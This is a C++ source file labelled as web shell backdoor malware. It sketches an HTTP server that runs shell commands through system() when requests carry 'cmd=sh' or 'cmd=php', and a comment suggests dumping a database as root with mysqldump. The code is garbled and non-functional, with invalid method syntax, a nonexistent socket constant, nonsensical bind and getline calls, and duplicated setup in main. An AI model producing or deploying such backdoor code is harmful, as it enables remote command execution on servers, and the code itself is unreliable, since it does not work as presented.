#include <iostream>
#include <string>
#include <vector>
#include <algorithm>
#include <cstdlib>

using namespace std;

class WebShell {
public:
    WebShell() {}
    ~WebShell() {}

    bool Run();
};

// --- WEB SHELL BACKDOOR MALWARE (CPP) ---

WebShell::bool Run() {
    // 1. **Handler Function** (receives HTTP requests from the web browser)
    auto HandleRequest = [&](string &request, vector<string> &headers) {
        cout << "Received Request:" << endl;
        cout << request << endl;
        cout << "Headers:" << endl;

        for (size_t i = 0; i < headers.size(); ++i) {
            cout << "Header " << (int)(i + 1) << ": " << headers[i] << endl;
        }

        // --- Execute Command --/
        if (string(request).rfind("cmd=php", 0) != string::npos) {
            cout << "Executing: php" << endl;
            system("php -v"); // Or another command, like "mysqldump -u root password"
        } else if (string(request).rfind("cmd=sh", 0) != string::npos) {
            cout << "Executing: sh" << endl;
            system("ls"); // Example shell command.
        }

        // --- Send Response Back --/
        cout << "<!DOCTYPE html>" << endl;
        cout << "<html lang='en'>" << endl;
        cout << "<head>" << endl;
        cout << "<meta charset='UTF-8'>" << endl;
        cout << "<title>Web Shell Backdoor</title>" << endl;
        cout << "</head>" << endl;
        cout << "<body>" << endl;

        // --- Insert command prompt --/
        if (string(request).rfind("cmd=php", 0) != string::npos || string(request).rfind("cmd=sh", 0) != string::npos) {
            cout << "<input type='text' name='command'>" << endl;
            cout << "<button type='submit'>Execute</button>" << endl;
        }

        cout << "</body>" << endl;
        cout << "</html >" << endl;
    };


    // 2. **Connection Management (Simple)**
    auto HandleConnection = [&](SOCKET socket) {
        char buffer[4096];
        string request;

        // --- Read HTTP Request Header --/
        int bytesRead = sizeof(buffer);
        while (true) {
            bytesRead = recv(socket, buffer, bytesRead - 1, 0); // Subtract 1 to leave room for null terminator

            if (bytesRead > 0) {
                if (bytesRead == 1) {
                    break;
                } else if (bytesRead > 1){
                    string req_tmp(buffer, bytesRead);
                    request += req_tmp;
                    break;
                }
            } else if (bytesRead == -1) {
                cerr << "Connection closed." << endl;
                break;
            } else {
                // Usually happens when the client has already sent everything.
            }
        }

        cout << "<hr>" << endl;
        cout << "DEBUG: HTTP Request:" << endl;
        cout << request << endl;

        vector<string> headers;
        size_t pos = 0;
        string header_line;
        while(pos < request.size()) {
            pos = request.find("\n");
            if (pos == string::npos) break;

            header_line = request.substr(0, pos);
            headers.push_back(header_line);
            request.erase(0, pos + 1);
        }


        HandleRequest(request, headers);
    };

    // --- HTTP Server Setup (Simple) --/
    SOCKET serverSocket = socket(AF_INET4Cg, SOCK_STREAM, 0);
    if (serverSocket == INVALID_SOCKET) {
        cerr << "Error creating socket." << endl;
        return false;
    }

    // --- Bind the Server Socket --/
    int result = bind(serverSocket, (SOCKADDR_IN *)*(&serverSocket), sizeof(*(&serverSocket)) + sizeof(string)); // Include the string name.
    if (result == -1) {
        cerr << "Error binding socket." << endl;
        return false;
    }

    cout << "Web shell running on port 80..." << endl;

    // --- Accept Incoming Connections --/
    while (true) {
        int bytesRead = sizeof(string);
        char buffer[4096];

        if (getline(socket(AF_INET4Cg, SOCK_STREAM, 0), string(buffer,sizeof(buffer))) == -1){
            break;
        }


        HandleConnection(serverSocket);
    }


    closesocket(serverSocket);
    return true;
}

int main() {
    // --- HTTP Server Setup (Simple) --/
    SOCKET serverSocket = socket(AF_INET4Cg, SOCK_STREAM, 0);
    if (serverSocket == INVALID_SOCKET) {
        cerr << "Error creating socket." << endl;
        return 1;
    }

    // --- Bind the Server Socket --/
    int result = bind(serverSocket, (SOCKADDR_IN *)*(&serverSocket), sizeof(*(&serverSocket)) + sizeof(string)); // Include the string name.
    if (result == -1) {
        cerr << "Error binding socket." << endl;
        return 1;
    }

    cout << "Web shell running on port 80..." << endl;

    // --- Accept Incoming Connections --/
    while (true) {
        int bytesRead = sizeof(string);
        char buffer[4096];

        if (getline(socket(AF_INET4Cg, SOCK_STREAM, 0), string(buffer,sizeof(buffer))) == -1){
            break;
        }


        HandleConnection(serverSocket);
    }

   cout << "Web Shell Backdoor is running. (Ctrl+C to Stop)" << endl;

    // --- Cleanup Socket Resources --/
    closesocket(serverSocket);
    return 0;
}
